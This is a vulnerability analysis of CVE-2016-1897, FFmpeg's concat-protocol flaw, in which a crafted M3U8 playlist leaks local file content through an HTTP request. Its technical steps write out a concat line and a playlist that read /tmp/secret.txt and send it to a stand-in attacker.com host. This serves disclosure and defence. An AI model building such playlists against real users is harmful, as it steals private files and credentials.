Based on the provided content, here's a breakdown of the vulnerability described by CVE-2016-1897:

**Root Cause:**

The vulnerability stems from a cross-origin issue in how FFmpeg processes URLs, specifically when using the `concat` protocol within an HTTP Live Streaming (HLS) M3U8 file.

**Weaknesses/Vulnerabilities:**

*   **Cross-Origin Issue:** FFmpeg doesn't properly restrict access when using the `concat` protocol. This allows a crafted M3U8 file to force the application to access arbitrary external URLs.
*   **Local File Inclusion:** The external URL is constructed using data from the victim's local filesystem. This means the attacker can extract local file content.

**Impact of Exploitation:**

*   **Local File Disclosure:** An attacker can gain access to the contents of local files on the victim's machine. The first line of the targeted local file is embedded within a generated URL, which is sent to an external server under the attacker's control.
*   **Information Leakage:** The leaked information from the local file can be sensitive, such as configuration data, credentials, or other private information.

**Attack Vectors:**

*   **Crafted M3U8 File:** An attacker creates a malicious M3U8 playlist file, which uses the `concat` protocol to specify the concatenation of a remote file, a local file, and another remote file.

**Required Attacker Capabilities/Position:**

*   **Delivery of Malicious File:** The attacker needs to trick the victim into opening or processing the specially crafted M3U8 file. This could involve tricking a user into opening a malicious video, or a file manager using FFmpeg to generate a thumbnail of the malicious M3U8.
*   **External Server:** The attacker requires an external server to receive the HTTP request containing the leaked local file content.

**Technical Details:**

1.  The victim opens a malicious M3U8 playlist (e.g., `steal_secret.avi`).
2.  The M3U8 file contains a line such as: `concat:http://attacker.com/head.m3u8|file:///tmp/secret.txt|http://attacker.com/tail.m3u8`.
3.  FFmpeg concatenates the content of `head.m3u8`, `/tmp/secret.txt`, and `tail.m3u8`
4.  The concatenation results in an HLS file that looks like:
     ```
     #EXTM3U
     #EXT-X-MEDIA-SEQUENCE:0
     #EXTINF:,
     http://attacker.com/steal.php?secret=your_secret_word&.txt
     #EXT-X-ENDLIST
     ```
5.  The content of `/tmp/secret.txt` is inserted into the URL.
6.  FFmpeg then sends an HTTP request containing the leaked data (`your_secret_word` in the example) to the attacker's server (`attacker.com`).

**Additional Notes:**

*   The vulnerability affects FFmpeg and libav-based players.
*   The vulnerability does not require any bugs or code execution. It exploits a feature of the `concat` protocol.
*   Some media players might not display the leaked content in the video but still leak the content via the HTTP request.
*   The vulnerability can also be exploited by file managers, as they use ffmpeg to generate thumbnails, and so simply browsing a directory containing a malicious file may result in information leakage.
*   The provided content indicates that similar vulnerability exists with the `subfile` protocol described by CVE-2016-1898
